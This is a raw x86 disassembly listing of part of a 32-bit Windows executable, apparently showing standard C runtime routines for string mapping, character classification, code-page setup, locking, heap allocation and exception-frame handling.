  430955:	cmp    DWORD PTR ds:0x43fb54,ebx
  43095b:	jne    0x430995
  43095d:	push   ebx
  43095e:	push   ebx
  43095f:	xor    esi,esi
  430961:	inc    esi
  430962:	push   esi
  430963:	push   0x439764
  430968:	push   0x100
  43096d:	push   ebx
  43096e:	call   DWORD PTR ds:0x4390b0
  430974:	test   eax,eax
  430976:	je     0x430980
  430978:	mov    DWORD PTR ds:0x43fb54,esi
  43097e:	jmp    0x430995
  430980:	call   DWORD PTR ds:0x4390ac
  430986:	cmp    eax,0x78
  430989:	jne    0x430995
  43098b:	mov    DWORD PTR ds:0x43fb54,0x2
  430995:	cmp    DWORD PTR [ebp+0x14],ebx
  430998:	jle    0x4309b5
  43099a:	mov    ecx,DWORD PTR [ebp+0x14]
  43099d:	mov    eax,DWORD PTR [ebp+0x10]
  4309a0:	dec    ecx
  4309a1:	cmp    BYTE PTR [eax],bl
  4309a3:	je     0x4309ad
  4309a5:	inc    eax
  4309a6:	cmp    ecx,ebx
  4309a8:	jne    0x4309a0
  4309aa:	or     ecx,0xffffffff
  4309ad:	or     eax,0xffffffff
  4309b0:	sub    eax,ecx
  4309b2:	add    DWORD PTR [ebp+0x14],eax
  4309b5:	mov    eax,ds:0x43fb54
  4309ba:	cmp    eax,0x2
  4309bd:	je     0x430b9f
  4309c3:	cmp    eax,ebx
  4309c5:	je     0x430b9f
  4309cb:	cmp    eax,0x1
  4309ce:	jne    0x430bd2
  4309d4:	xor    edi,edi
  4309d6:	mov    DWORD PTR [ebp-0x2c],edi
  4309d9:	mov    DWORD PTR [ebp-0x38],ebx
  4309dc:	mov    DWORD PTR [ebp-0x34],ebx
  4309df:	cmp    DWORD PTR [ebp+0x20],ebx
  4309e2:	jne    0x4309ec
  4309e4:	mov    eax,ds:0x43fe64
  4309e9:	mov    DWORD PTR [ebp+0x20],eax
  4309ec:	push   ebx
  4309ed:	push   ebx
  4309ee:	push   DWORD PTR [ebp+0x14]
  4309f1:	push   DWORD PTR [ebp+0x10]
  4309f4:	xor    eax,eax
  4309f6:	cmp    DWORD PTR [ebp+0x24],ebx
  4309f9:	setne  al
  4309fc:	lea    eax,[eax*8+0x1]
  430a03:	push   eax
  430a04:	push   DWORD PTR [ebp+0x20]
  430a07:	call   DWORD PTR ds:0x4390a8
  430a0d:	mov    esi,eax
  430a0f:	mov    DWORD PTR [ebp-0x30],esi
  430a12:	cmp    esi,ebx
  430a14:	je     0x430bd2
  430a1a:	mov    DWORD PTR [ebp-0x4],0x1
  430a21:	lea    eax,[esi+esi*1]
  430a24:	add    eax,0x3
  430a27:	and    eax,0xfffffffc
  430a2a:	call   0x433bb0
  430a2f:	mov    DWORD PTR [ebp-0x18],esp
  430a32:	mov    eax,esp
  430a34:	mov    DWORD PTR [ebp-0x1c],eax
  430a37:	or     DWORD PTR [ebp-0x4],0xffffffff
  430a3b:	jmp    0x430a58
  430a3d:	xor    eax,eax
  430a3f:	inc    eax
  430a40:	ret    
  430a41:	mov    esp,DWORD PTR [ebp-0x18]
  430a44:	call   0x435e66
  430a49:	xor    ebx,ebx
  430a4b:	mov    DWORD PTR [ebp-0x1c],ebx
  430a4e:	or     DWORD PTR [ebp-0x4],0xffffffff
  430a52:	mov    edi,DWORD PTR [ebp-0x2c]
  430a55:	mov    esi,DWORD PTR [ebp-0x30]
  430a58:	cmp    DWORD PTR [ebp-0x1c],ebx
  430a5b:	jne    0x430a79
  430a5d:	lea    eax,[esi+esi*1]
  430a60:	push   eax
  430a61:	call   0x4311fe
  430a66:	pop    ecx
  430a67:	mov    DWORD PTR [ebp-0x1c],eax
  430a6a:	cmp    eax,ebx
  430a6c:	je     0x430bd2
  430a72:	mov    DWORD PTR [ebp-0x38],0x1
  430a79:	push   esi
  430a7a:	push   DWORD PTR [ebp-0x1c]
  430a7d:	push   DWORD PTR [ebp+0x14]
  430a80:	push   DWORD PTR [ebp+0x10]
  430a83:	push   0x1
  430a85:	push   DWORD PTR [ebp+0x20]
  430a88:	call   DWORD PTR ds:0x4390a8
  430a8e:	test   eax,eax
  430a90:	je     0x430b7c
  430a96:	push   ebx
  430a97:	push   ebx
  430a98:	push   esi
  430a99:	push   DWORD PTR [ebp-0x1c]
  430a9c:	push   DWORD PTR [ebp+0xc]
  430a9f:	push   DWORD PTR [ebp+0x8]
  430aa2:	call   DWORD PTR ds:0x4390b0
  430aa8:	mov    edi,eax
  430aaa:	mov    DWORD PTR [ebp-0x2c],edi
  430aad:	cmp    edi,ebx
  430aaf:	je     0x430b7c
  430ab5:	test   BYTE PTR [ebp+0xd],0x4
  430ab9:	je     0x430ae8
  430abb:	cmp    DWORD PTR [ebp+0x1c],ebx
  430abe:	je     0x430b7c
  430ac4:	cmp    edi,DWORD PTR [ebp+0x1c]
  430ac7:	jg     0x430b7c
  430acd:	push   DWORD PTR [ebp+0x1c]
  430ad0:	push   DWORD PTR [ebp+0x18]
  430ad3:	push   esi
  430ad4:	push   DWORD PTR [ebp-0x1c]
  430ad7:	push   DWORD PTR [ebp+0xc]
  430ada:	push   DWORD PTR [ebp+0x8]
  430add:	call   DWORD PTR ds:0x4390b0
  430ae3:	jmp    0x430b7c
  430ae8:	mov    DWORD PTR [ebp-0x4],0x2
  430aef:	lea    eax,[edi+edi*1]
  430af2:	add    eax,0x3
  430af5:	and    eax,0xfffffffc
  430af8:	call   0x433bb0
  430afd:	mov    DWORD PTR [ebp-0x18],esp
  430b00:	mov    eax,esp
  430b02:	mov    DWORD PTR [ebp-0x20],eax
  430b05:	or     DWORD PTR [ebp-0x4],0xffffffff
  430b09:	jmp    0x430b26
  430b0b:	xor    eax,eax
  430b0d:	inc    eax
  430b0e:	ret    
  430b0f:	mov    esp,DWORD PTR [ebp-0x18]
  430b12:	call   0x435e66
  430b17:	xor    ebx,ebx
  430b19:	mov    DWORD PTR [ebp-0x20],ebx
  430b1c:	or     DWORD PTR [ebp-0x4],0xffffffff
  430b20:	mov    edi,DWORD PTR [ebp-0x2c]
  430b23:	mov    esi,DWORD PTR [ebp-0x30]
  430b26:	cmp    DWORD PTR [ebp-0x20],ebx
  430b29:	jne    0x430b43
  430b2b:	lea    eax,[edi+edi*1]
  430b2e:	push   eax
  430b2f:	call   0x4311fe
  430b34:	pop    ecx
  430b35:	mov    DWORD PTR [ebp-0x20],eax
  430b38:	cmp    eax,ebx
  430b3a:	je     0x430b7c
  430b3c:	mov    DWORD PTR [ebp-0x34],0x1
  430b43:	push   edi
  430b44:	push   DWORD PTR [ebp-0x20]
  430b47:	push   esi
  430b48:	push   DWORD PTR [ebp-0x1c]
  430b4b:	push   DWORD PTR [ebp+0xc]
  430b4e:	push   DWORD PTR [ebp+0x8]
  430b51:	call   DWORD PTR ds:0x4390b0
  430b57:	test   eax,eax
  430b59:	je     0x430b7c
  430b5b:	push   ebx
  430b5c:	push   ebx
  430b5d:	cmp    DWORD PTR [ebp+0x1c],ebx
  430b60:	jne    0x430b66
  430b62:	push   ebx
  430b63:	push   ebx
  430b64:	jmp    0x430b6c
  430b66:	push   DWORD PTR [ebp+0x1c]
  430b69:	push   DWORD PTR [ebp+0x18]
  430b6c:	push   edi
  430b6d:	push   DWORD PTR [ebp-0x20]
  430b70:	push   ebx
  430b71:	push   DWORD PTR [ebp+0x20]
  430b74:	call   DWORD PTR ds:0x4390a4
  430b7a:	mov    edi,eax
  430b7c:	cmp    DWORD PTR [ebp-0x34],ebx
  430b7f:	je     0x430b8a
  430b81:	push   DWORD PTR [ebp-0x20]
  430b84:	call   0x42e0ed
  430b89:	pop    ecx
  430b8a:	cmp    DWORD PTR [ebp-0x38],ebx
  430b8d:	je     0x430b98
  430b8f:	push   DWORD PTR [ebp-0x1c]
  430b92:	call   0x42e0ed
  430b97:	pop    ecx
  430b98:	mov    eax,edi
  430b9a:	jmp    0x430cfa
  430b9f:	mov    DWORD PTR [ebp-0x28],ebx
  430ba2:	xor    edi,edi
  430ba4:	mov    DWORD PTR [ebp-0x3c],ebx
  430ba7:	cmp    DWORD PTR [ebp+0x8],ebx
  430baa:	jne    0x430bb4
  430bac:	mov    eax,ds:0x43fe54
  430bb1:	mov    DWORD PTR [ebp+0x8],eax
  430bb4:	cmp    DWORD PTR [ebp+0x20],ebx
  430bb7:	jne    0x430bc1
  430bb9:	mov    eax,ds:0x43fe64
  430bbe:	mov    DWORD PTR [ebp+0x20],eax
  430bc1:	push   DWORD PTR [ebp+0x8]
  430bc4:	call   0x435c5a
  430bc9:	pop    ecx
  430bca:	mov    DWORD PTR [ebp-0x40],eax
  430bcd:	cmp    eax,0xffffffff
  430bd0:	jne    0x430bd9
  430bd2:	xor    eax,eax
  430bd4:	jmp    0x430cfa
  430bd9:	cmp    eax,DWORD PTR [ebp+0x20]
  430bdc:	je     0x430cd0
  430be2:	push   ebx
  430be3:	push   ebx
  430be4:	lea    ecx,[ebp+0x14]
  430be7:	push   ecx
  430be8:	push   DWORD PTR [ebp+0x10]
  430beb:	push   eax
  430bec:	push   DWORD PTR [ebp+0x20]
  430bef:	call   0x435c9d
  430bf4:	add    esp,0x18
  430bf7:	mov    DWORD PTR [ebp-0x28],eax
  430bfa:	cmp    eax,ebx
  430bfc:	je     0x430bd2
  430bfe:	push   ebx
  430bff:	push   ebx
  430c00:	push   DWORD PTR [ebp+0x14]
  430c03:	push   eax
  430c04:	push   DWORD PTR [ebp+0xc]
  430c07:	push   DWORD PTR [ebp+0x8]
  430c0a:	call   DWORD PTR ds:0x4390a0
  430c10:	mov    esi,eax
  430c12:	mov    DWORD PTR [ebp-0x24],esi
  430c15:	cmp    esi,ebx
  430c17:	je     0x430cbf
  430c1d:	mov    DWORD PTR [ebp-0x4],ebx
  430c20:	add    eax,0x3
  430c23:	and    eax,0xfffffffc
  430c26:	call   0x433bb0
  430c2b:	mov    DWORD PTR [ebp-0x18],esp
  430c2e:	mov    edi,esp
  430c30:	mov    DWORD PTR [ebp-0x44],edi
  430c33:	push   esi
  430c34:	push   ebx
  430c35:	push   edi
  430c36:	call   0x42e4e0
  430c3b:	add    esp,0xc
  430c3e:	jmp    0x430c50
  430c40:	xor    eax,eax
  430c42:	inc    eax
  430c43:	ret    
  430c44:	mov    esp,DWORD PTR [ebp-0x18]
  430c47:	call   0x435e66
  430c4c:	xor    ebx,ebx
  430c4e:	xor    edi,edi
  430c50:	or     DWORD PTR [ebp-0x4],0xffffffff
  430c54:	cmp    edi,ebx
  430c56:	jne    0x430c7b
  430c58:	push   DWORD PTR [ebp-0x24]
  430c5b:	call   0x4311fe
  430c60:	pop    ecx
  430c61:	mov    edi,eax
  430c63:	cmp    edi,ebx
  430c65:	je     0x430c98
  430c67:	push   DWORD PTR [ebp-0x24]
  430c6a:	push   ebx
  430c6b:	push   edi
  430c6c:	call   0x42e4e0
  430c71:	add    esp,0xc
  430c74:	mov    DWORD PTR [ebp-0x3c],0x1
  430c7b:	push   DWORD PTR [ebp-0x24]
  430c7e:	push   edi
  430c7f:	push   DWORD PTR [ebp+0x14]
  430c82:	push   DWORD PTR [ebp-0x28]
  430c85:	push   DWORD PTR [ebp+0xc]
  430c88:	push   DWORD PTR [ebp+0x8]
  430c8b:	call   DWORD PTR ds:0x4390a0
  430c91:	mov    DWORD PTR [ebp-0x24],eax
  430c94:	cmp    eax,ebx
  430c96:	jne    0x430c9c
  430c98:	xor    esi,esi
  430c9a:	jmp    0x430cc2
  430c9c:	push   DWORD PTR [ebp+0x1c]
  430c9f:	push   DWORD PTR [ebp+0x18]
  430ca2:	lea    eax,[ebp-0x24]
  430ca5:	push   eax
  430ca6:	push   edi
  430ca7:	push   DWORD PTR [ebp+0x20]
  430caa:	push   DWORD PTR [ebp-0x40]
  430cad:	call   0x435c9d
  430cb2:	add    esp,0x18
  430cb5:	mov    esi,eax
  430cb7:	neg    esi
  430cb9:	sbb    esi,esi
  430cbb:	neg    esi
  430cbd:	jmp    0x430cc2
  430cbf:	mov    esi,DWORD PTR [ebp-0x48]
  430cc2:	cmp    DWORD PTR [ebp-0x3c],ebx
  430cc5:	je     0x430cea
  430cc7:	push   edi
  430cc8:	call   0x42e0ed
  430ccd:	pop    ecx
  430cce:	jmp    0x430cea
  430cd0:	push   DWORD PTR [ebp+0x1c]
  430cd3:	push   DWORD PTR [ebp+0x18]
  430cd6:	push   DWORD PTR [ebp+0x14]
  430cd9:	push   DWORD PTR [ebp+0x10]
  430cdc:	push   DWORD PTR [ebp+0xc]
  430cdf:	push   DWORD PTR [ebp+0x8]
  430ce2:	call   DWORD PTR ds:0x4390a0
  430ce8:	mov    esi,eax
  430cea:	cmp    DWORD PTR [ebp-0x28],ebx
  430ced:	je     0x430cf8
  430cef:	push   DWORD PTR [ebp-0x28]
  430cf2:	call   0x42e0ed
  430cf7:	pop    ecx
  430cf8:	mov    eax,esi
  430cfa:	lea    esp,[ebp-0x54]
  430cfd:	call   0x43124b
  430d02:	ret    
  430d03:	mov    eax,ds:0x43d874
  430d08:	ret    
  430d09:	call   0x433901
  430d0e:	mov    eax,DWORD PTR [eax+0x64]
  430d11:	cmp    eax,DWORD PTR ds:0x43d6ec
  430d17:	je     0x430d1e
  430d19:	call   0x42f803
  430d1e:	cmp    DWORD PTR [eax+0x28],0x1
  430d22:	jle    0x430d34
  430d24:	push   0x1
  430d26:	push   DWORD PTR [esp+0x8]
  430d2a:	push   eax
  430d2b:	call   0x435f49
  430d30:	add    esp,0xc
  430d33:	ret    
  430d34:	mov    eax,DWORD PTR [eax+0x48]
  430d37:	mov    ecx,DWORD PTR [esp+0x4]
  430d3b:	movzx  eax,BYTE PTR [eax+ecx*2]
  430d3f:	and    eax,0x1
  430d42:	ret    
  430d43:	call   0x433901
  430d48:	mov    eax,DWORD PTR [eax+0x64]
  430d4b:	cmp    eax,DWORD PTR ds:0x43d6ec
  430d51:	je     0x430d58
  430d53:	call   0x42f803
  430d58:	cmp    DWORD PTR [eax+0x28],0x1
  430d5c:	jle    0x430d6e
  430d5e:	push   0x2
  430d60:	push   DWORD PTR [esp+0x8]
  430d64:	push   eax
  430d65:	call   0x435f49
  430d6a:	add    esp,0xc
  430d6d:	ret    
  430d6e:	mov    eax,DWORD PTR [eax+0x48]
  430d71:	mov    ecx,DWORD PTR [esp+0x4]
  430d75:	movzx  eax,BYTE PTR [eax+ecx*2]
  430d79:	and    eax,0x2
  430d7c:	ret    
  430d7d:	call   0x433901
  430d82:	mov    eax,DWORD PTR [eax+0x64]
  430d85:	cmp    eax,DWORD PTR ds:0x43d6ec
  430d8b:	je     0x430d92
  430d8d:	call   0x42f803
  430d92:	cmp    DWORD PTR [eax+0x28],0x1
  430d96:	jle    0x430da8
  430d98:	push   0x4
  430d9a:	push   DWORD PTR [esp+0x8]
  430d9e:	push   eax
  430d9f:	call   0x435f49
  430da4:	add    esp,0xc
  430da7:	ret    
  430da8:	mov    eax,DWORD PTR [eax+0x48]
  430dab:	mov    ecx,DWORD PTR [esp+0x4]
  430daf:	movzx  eax,BYTE PTR [eax+ecx*2]
  430db3:	and    eax,0x4
  430db6:	ret    
  430db7:	push   ebp
  430db8:	mov    ebp,esp
  430dba:	sub    esp,0x24
  430dbd:	mov    eax,ds:0x43d404
  430dc2:	push   edi
  430dc3:	xor    edi,edi
  430dc5:	cmp    DWORD PTR ds:0x43fe54,edi
  430dcb:	mov    DWORD PTR [ebp-0x4],eax
  430dce:	mov    DWORD PTR [ebp-0x1c],edi
  430dd1:	je     0x430f7e
  430dd7:	cmp    DWORD PTR ds:0x43fe64,edi
  430ddd:	push   ebx
  430dde:	push   esi
  430ddf:	jne    0x430e04
  430de1:	movzx  eax,WORD PTR ds:0x43fe7c
  430de8:	push   0x43fe64
  430ded:	push   0x1004
  430df2:	push   eax
  430df3:	push   edi
  430df4:	call   0x435fc0
  430df9:	add    esp,0x10
  430dfc:	test   eax,eax
  430dfe:	jne    0x430f66
  430e04:	push   0x4
  430e06:	call   0x4311fe
  430e0b:	mov    ebx,eax
  430e0d:	mov    DWORD PTR [ebp-0x20],ebx
  430e10:	mov    DWORD PTR [esp],0x300
  430e17:	call   0x4311fe
  430e1c:	mov    esi,eax
  430e1e:	mov    DWORD PTR [esp],0x101
  430e25:	call   0x4311fe
  430e2a:	cmp    ebx,edi
  430e2c:	pop    ecx
  430e2d:	mov    DWORD PTR [ebp-0x1c],eax
  430e30:	je     0x430f69
  430e36:	cmp    esi,edi
  430e38:	je     0x430f69
  430e3e:	cmp    eax,edi
  430e40:	je     0x430f69
  430e46:	mov    DWORD PTR [ebx],edi
  430e48:	xor    eax,eax
  430e4a:	mov    edi,0x100
  430e4f:	mov    ecx,DWORD PTR [ebp-0x1c]
  430e52:	mov    BYTE PTR [eax+ecx*1],al
  430e55:	inc    eax
  430e56:	cmp    eax,edi
  430e58:	jl     0x430e4f
  430e5a:	lea    eax,[ebp-0x18]
  430e5d:	push   eax
  430e5e:	push   DWORD PTR ds:0x43fe64
  430e64:	call   DWORD PTR ds:0x4390b4
  430e6a:	test   eax,eax
  430e6c:	je     0x430f69
  430e72:	cmp    DWORD PTR [ebp-0x18],0x5
  430e76:	ja     0x430f69
  430e7c:	movzx  eax,WORD PTR [ebp-0x18]
  430e80:	cmp    eax,0x1
  430e83:	mov    ds:0x43dd90,eax
  430e88:	jle    0x430eb9
  430e8a:	cmp    BYTE PTR [ebp-0x12],0x0
  430e8e:	je     0x430eb9
  430e90:	lea    eax,[ebp-0x11]
  430e93:	mov    dl,BYTE PTR [eax]
  430e95:	test   dl,dl
  430e97:	je     0x430eb9
  430e99:	movzx  ecx,BYTE PTR [eax-0x1]
  430e9d:	movzx  edx,dl
  430ea0:	jmp    0x430ead
  430ea2:	mov    edx,DWORD PTR [ebp-0x1c]
  430ea5:	mov    BYTE PTR [ecx+edx*1],0x0
  430ea9:	movzx  edx,BYTE PTR [eax]
  430eac:	inc    ecx
  430ead:	cmp    ecx,edx
  430eaf:	jle    0x430ea2
  430eb1:	inc    eax
  430eb2:	inc    eax
  430eb3:	cmp    BYTE PTR [eax-0x1],0x0
  430eb7:	jne    0x430e93
  430eb9:	xor    eax,eax
  430ebb:	push   eax
  430ebc:	push   eax
  430ebd:	push   eax
  430ebe:	lea    ebx,[esi+0x100]
  430ec4:	push   ebx
  430ec5:	push   edi
  430ec6:	push   DWORD PTR [ebp-0x1c]
  430ec9:	mov    DWORD PTR [ebp-0x24],ebx
  430ecc:	push   0x1
  430ece:	call   0x435738
  430ed3:	add    esp,0x1c
  430ed6:	test   eax,eax
  430ed8:	je     0x430f69
  430ede:	lea    edi,[esi+0xfe]
  430ee4:	and    WORD PTR [edi],0x0
  430ee8:	cmp    DWORD PTR ds:0x43dd90,0x1
  430eef:	jle    0x430f2c
  430ef1:	cmp    BYTE PTR [ebp-0x12],0x0
  430ef5:	je     0x430f2c
  430ef7:	lea    eax,[ebp-0x11]
  430efa:	mov    dl,BYTE PTR [eax]
  430efc:	test   dl,dl
  430efe:	je     0x430f2c
  430f00:	movzx  ecx,BYTE PTR [eax-0x1]
  430f04:	movzx  edx,dl
  430f07:	cmp    ecx,edx
  430f09:	jg     0x430f24
  430f0b:	lea    edx,[esi+ecx*2+0x100]
  430f12:	mov    WORD PTR [edx],0x8000
  430f17:	movzx  ebx,BYTE PTR [eax]
  430f1a:	inc    ecx
  430f1b:	inc    edx
  430f1c:	inc    edx
  430f1d:	cmp    ecx,ebx
  430f1f:	jle    0x430f12
  430f21:	mov    ebx,DWORD PTR [ebp-0x24]
  430f24:	inc    eax
  430f25:	inc    eax
  430f26:	cmp    BYTE PTR [eax-0x1],0x0
  430f2a:	jne    0x430efa
  430f2c:	push   0xfe
  430f31:	lea    eax,[esi+0x200]
  430f37:	push   eax
  430f38:	push   esi
  430f39:	call   0x42da10
  430f3e:	mov    eax,DWORD PTR [ebp-0x20]
  430f41:	add    esp,0xc
  430f44:	mov    DWORD PTR ds:0x43d874,ebx
  430f4a:	mov    ds:0x46523c,eax
  430f4f:	mov    DWORD PTR ds:0x465238,edi
  430f55:	xor    esi,esi
  430f57:	push   DWORD PTR [ebp-0x1c]
  430f5a:	call   0x42e0ed
  430f5f:	pop    ecx
  430f60:	mov    eax,esi
  430f62:	pop    esi
  430f63:	pop    ebx
  430f64:	jmp    0x430f96
  430f66:	mov    esi,DWORD PTR [ebp-0x24]
  430f69:	push   DWORD PTR [ebp-0x20]
  430f6c:	call   0x42e0ed
  430f71:	push   esi
  430f72:	call   0x42e0ed
  430f77:	pop    ecx
  430f78:	xor    esi,esi
  430f7a:	pop    ecx
  430f7b:	inc    esi
  430f7c:	jmp    0x430f57
  430f7e:	mov    DWORD PTR ds:0x43d874,0x439890
  430f88:	mov    DWORD PTR ds:0x46523c,edi
  430f8e:	mov    DWORD PTR ds:0x465238,edi
  430f94:	xor    eax,eax
  430f96:	mov    ecx,DWORD PTR [ebp-0x4]
  430f99:	pop    edi
  430f9a:	call   0x42f1f2
  430f9f:	leave  
  430fa0:	ret    
  430fa1:	call   0x433901
  430fa6:	mov    eax,DWORD PTR [eax+0x64]
  430fa9:	cmp    eax,DWORD PTR ds:0x43d6ec
  430faf:	je     0x430fb6
  430fb1:	call   0x42f803
  430fb6:	mov    eax,DWORD PTR [eax+0x4]
  430fb9:	ret    
  430fba:	call   0x433901
  430fbf:	mov    eax,DWORD PTR [eax+0x64]
  430fc2:	cmp    eax,DWORD PTR ds:0x43d6ec
  430fc8:	je     0x430fcf
  430fca:	call   0x42f803
  430fcf:	add    eax,0xc
  430fd2:	ret    
  430fd3:	push   esi
  430fd4:	push   edi
  430fd5:	xor    esi,esi
  430fd7:	mov    edi,0x43fb58
  430fdc:	cmp    DWORD PTR [esi*8+0x43d884],0x1
  430fe4:	jne    0x431004
  430fe6:	lea    eax,[esi*8+0x43d880]
  430fed:	mov    DWORD PTR [eax],edi
  430fef:	push   0xfa0
  430ff4:	push   DWORD PTR [eax]
  430ff6:	add    edi,0x18
  430ff9:	call   0x4360f7
  430ffe:	test   eax,eax
  431000:	pop    ecx
  431001:	pop    ecx
  431002:	je     0x431010
  431004:	inc    esi
  431005:	cmp    esi,0x24
  431008:	jl     0x430fdc
  43100a:	xor    eax,eax
  43100c:	inc    eax
  43100d:	pop    edi
  43100e:	pop    esi
  43100f:	ret    
  431010:	and    DWORD PTR [esi*8+0x43d880],0x0
  431018:	xor    eax,eax
  43101a:	jmp    0x43100d
  43101c:	push   ebx
  43101d:	mov    ebx,DWORD PTR ds:0x439084
  431023:	push   esi
  431024:	mov    esi,0x43d880
  431029:	push   edi
  43102a:	mov    edi,DWORD PTR [esi]
  43102c:	test   edi,edi
  43102e:	je     0x431043
  431030:	cmp    DWORD PTR [esi+0x4],0x1
  431034:	je     0x431043
  431036:	push   edi
  431037:	call   ebx
  431039:	push   edi
  43103a:	call   0x42e0ed
  43103f:	and    DWORD PTR [esi],0x0
  431042:	pop    ecx
  431043:	add    esi,0x8
  431046:	cmp    esi,0x43d9a0
  43104c:	jl     0x43102a
  43104e:	mov    esi,0x43d880
  431053:	pop    edi
  431054:	mov    eax,DWORD PTR [esi]
  431056:	test   eax,eax
  431058:	je     0x431063
  43105a:	cmp    DWORD PTR [esi+0x4],0x1
  43105e:	jne    0x431063
  431060:	push   eax
  431061:	call   ebx
  431063:	add    esi,0x8
  431066:	cmp    esi,0x43d9a0
  43106c:	jl     0x431054
  43106e:	pop    esi
  43106f:	pop    ebx
  431070:	ret    
  431071:	push   ebp
  431072:	mov    ebp,esp
  431074:	mov    eax,DWORD PTR [ebp+0x8]
  431077:	push   DWORD PTR [eax*8+0x43d880]
  43107e:	call   DWORD PTR ds:0x43908c
  431084:	pop    ebp
  431085:	ret    
  431086:	push   0x8
  431088:	push   0x439c98
  43108d:	call   0x431210
  431092:	mov    esi,DWORD PTR [ebp+0x8]
  431095:	lea    esi,[esi*8+0x43d880]
  43109c:	xor    ebx,ebx
  43109e:	cmp    DWORD PTR [esi],ebx
  4310a0:	jne    0x431114
  4310a2:	push   0x18
  4310a4:	call   0x4311fe
  4310a9:	pop    ecx
  4310aa:	mov    edi,eax
  4310ac:	cmp    edi,ebx
  4310ae:	jne    0x4310bd
  4310b0:	call   0x432878
  4310b5:	mov    DWORD PTR [eax],0xc
  4310bb:	jmp    0x4310fc
  4310bd:	push   0xa
  4310bf:	call   0x431126
  4310c4:	pop    ecx
  4310c5:	mov    DWORD PTR [ebp-0x4],ebx
  4310c8:	cmp    DWORD PTR [esi],ebx
  4310ca:	jne    0x431104
  4310cc:	push   0xfa0
  4310d1:	push   edi
  4310d2:	call   0x4360f7
  4310d7:	pop    ecx
  4310d8:	pop    ecx
  4310d9:	test   eax,eax
  4310db:	jne    0x431100
  4310dd:	push   edi
  4310de:	call   0x42e0ed
  4310e3:	call   0x432878
  4310e8:	mov    DWORD PTR [eax],0xc
  4310ee:	push   0xffffffff
  4310f0:	lea    eax,[ebp-0x10]
  4310f3:	push   eax
  4310f4:	call   0x42f0ba
  4310f9:	add    esp,0xc
  4310fc:	xor    eax,eax
  4310fe:	jmp    0x431117
  431100:	mov    DWORD PTR [esi],edi
  431102:	jmp    0x43110b
  431104:	push   edi
  431105:	call   0x42e0ed
  43110a:	pop    ecx
  43110b:	or     DWORD PTR [ebp-0x4],0xffffffff
  43110f:	call   0x43111d
  431114:	xor    eax,eax
  431116:	inc    eax
  431117:	call   0x43124b
  43111c:	ret    
  43111d:	push   0xa
  43111f:	call   0x431071
  431124:	pop    ecx
  431125:	ret    
  431126:	push   ebp
  431127:	mov    ebp,esp
  431129:	mov    eax,DWORD PTR [ebp+0x8]
  43112c:	push   esi
  43112d:	lea    esi,[eax*8+0x43d880]
  431134:	cmp    DWORD PTR [esi],0x0
  431137:	jne    0x43114c
  431139:	push   eax
  43113a:	call   0x431086
  43113f:	test   eax,eax
  431141:	pop    ecx
  431142:	jne    0x43114c
  431144:	push   0x11
  431146:	call   0x42ea7f
  43114b:	pop    ecx
  43114c:	push   DWORD PTR [esi]
  43114e:	call   DWORD PTR ds:0x439088
  431154:	pop    esi
  431155:	pop    ebp
  431156:	ret    
  431157:	push   0xc
  431159:	push   0x439ca8
  43115e:	call   0x431210
  431163:	mov    esi,DWORD PTR [ebp+0x8]
  431166:	cmp    DWORD PTR ds:0x465234,0x3
  43116d:	jne    0x43119d
  43116f:	cmp    esi,DWORD PTR ds:0x465220
  431175:	ja     0x43119d
  431177:	push   0x4
  431179:	call   0x431126
  43117e:	pop    ecx
  43117f:	and    DWORD PTR [ebp-0x4],0x0
  431183:	push   esi
  431184:	call   0x431d43
  431189:	pop    ecx
  43118a:	mov    DWORD PTR [ebp-0x1c],eax
  43118d:	or     DWORD PTR [ebp-0x4],0xffffffff
  431191:	call   0x4311c9
  431196:	mov    eax,DWORD PTR [ebp-0x1c]
  431199:	test   eax,eax
  43119b:	jne    0x4311c0
  43119d:	test   esi,esi
  43119f:	jne    0x4311a2
  4311a1:	inc    esi
  4311a2:	cmp    DWORD PTR ds:0x465234,0x1
  4311a9:	je     0x4311b1
  4311ab:	add    esi,0xf
  4311ae:	and    esi,0xfffffff0
  4311b1:	push   esi
  4311b2:	push   0x0
  4311b4:	push   DWORD PTR ds:0x465230
  4311ba:	call   DWORD PTR ds:0x43900c
  4311c0:	call   0x43124b
  4311c5:	ret    
  4311c6:	mov    esi,DWORD PTR [ebp+0x8]
  4311c9:	push   0x4
  4311cb:	call   0x431071
  4311d0:	pop    ecx
  4311d1:	ret    
  4311d2:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4311d7:	ja     0x4311fb
  4311d9:	push   DWORD PTR [esp+0x4]
  4311dd:	call   0x431157
  4311e2:	test   eax,eax
  4311e4:	pop    ecx
  4311e5:	jne    0x4311fd
  4311e7:	cmp    DWORD PTR [esp+0x8],eax
  4311eb:	je     0x4311fd
  4311ed:	push   DWORD PTR [esp+0x4]
  4311f1:	call   0x431365
  4311f6:	test   eax,eax
  4311f8:	pop    ecx
  4311f9:	jne    0x4311d9
  4311fb:	xor    eax,eax
  4311fd:	ret    
  4311fe:	push   DWORD PTR ds:0x43fea0
  431204:	push   DWORD PTR [esp+0x8]
  431208:	call   0x4311d2
  43120d:	pop    ecx
  43120e:	pop    ecx
  43120f:	ret    
  431210:	push   0x431264
  431215:	mov    eax,fs:0x0
  43121b:	push   eax
  43121c:	mov    eax,DWORD PTR [esp+0x10]
  431220:	mov    DWORD PTR [esp+0x10],ebp
  431224:	lea    ebp,[esp+0x10]
  431228:	sub    esp,eax
  43122a:	push   ebx
  43122b:	push   esi
  43122c:	push   edi
  43122d:	mov    eax,DWORD PTR [ebp-0x8]
  431230:	mov    DWORD PTR [ebp-0x18],esp
  431233:	push   eax
  431234:	mov    eax,DWORD PTR [ebp-0x4]
  431237:	mov    DWORD PTR [ebp-0x4],0xffffffff
  43123e:	mov    DWORD PTR [ebp-0x8],eax
  431241:	lea    eax,[ebp-0x10]
  431244:	mov    fs:0x0,eax
  43124a:	ret    
  43124b:	mov    ecx,DWORD PTR [ebp-0x10]
  43124e:	mov    DWORD PTR fs:0x0,ecx
  431255:	pop    ecx
  431256:	pop    edi
  431257:	pop    esi
  431258:	pop    ebx
  431259:	leave  
  43125a:	push   ecx
  43125b:	ret    
  43125c:	push   esi
  43125d:	inc    ebx
  43125e:	xor    dh,BYTE PTR [eax]
  431260:	pop    eax
  431261:	inc    ebx
  431262:	xor    BYTE PTR [eax],dh
  431264:	push   ebp
  431265:	mov    ebp,esp
  431267:	sub    esp,0x8
  43126a:	push   ebx
  43126b:	push   esi
  43126c:	push   edi
  43126d:	push   ebp
  43126e:	cld    
  43126f:	mov    ebx,DWORD PTR [ebp+0xc]
  431272:	mov    eax,DWORD PTR [ebp+0x8]
  431275:	test   DWORD PTR [eax+0x4],0x6
  43127c:	jne    0x43132d
